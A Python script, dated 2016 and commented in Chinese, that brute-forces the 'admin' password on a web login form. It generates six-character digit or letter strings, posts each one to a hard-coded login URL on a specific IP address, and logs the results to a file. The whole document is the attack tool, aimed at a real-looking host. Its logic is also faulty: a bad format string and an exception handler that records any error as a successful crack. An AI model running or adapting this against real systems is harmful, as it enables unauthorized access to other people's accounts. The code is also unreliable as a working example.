"""
python3暴力穷举密码
2016年6月09日 04:39:25 codegay
"""
from itertools import product
from time import sleep
from tqdm import tqdm
from requests import post
import bs4


# 密码生成器
def psgen(x=4):
    iter = ['1234567890',
            'abcdefghijklmnopqrstuvwxyz',
            'ABCDEFGHIJKLMNOPQRSTUVWXYZ',

            ]
    for r in iter:
        for repeat in range(6, x + 1):
            for ps in product(r, repeat=repeat):
                yield ''.join(ps)


def fx(url):
    for ps in tqdm(psgen(6)):
        try:
            rs = post(url, data={'id': 'admin', 'password': ps}, allow_redirects=1)

            soup = bs4.BeautifulSoup(rs.text, 'lxml')

            message = soup.find('span', attrs={'style': 'color: red'}).text

            if passError == message:
                print(ps, message)
                with open("d:/python/破解/msg.txt", 'a+', encoding='utf-8') as f:
                    f.write('破解失败 ：%s \n' % ps)
            else:
                print('破解成功 : {}' % ps)
                with open("d:/python/破解/msg.txt", 'a+', encoding='utf-8') as f:
                    f.write('破解成功 : %s' % ps + '\n')
        # print(rs.text)

        except Exception as e:
            sleep(1)
            print('破解成功 : {}, {}'.format(ps, e))
            with open("d:/python/破解/msg.txt", 'a+', encoding='utf-8') as f:
                f.write('破解成功 : %s \n' % ps)


url = 'http://210.43.128.199/weblogin.do'
passError = '密码不正确!请重新输入'
fx(url)
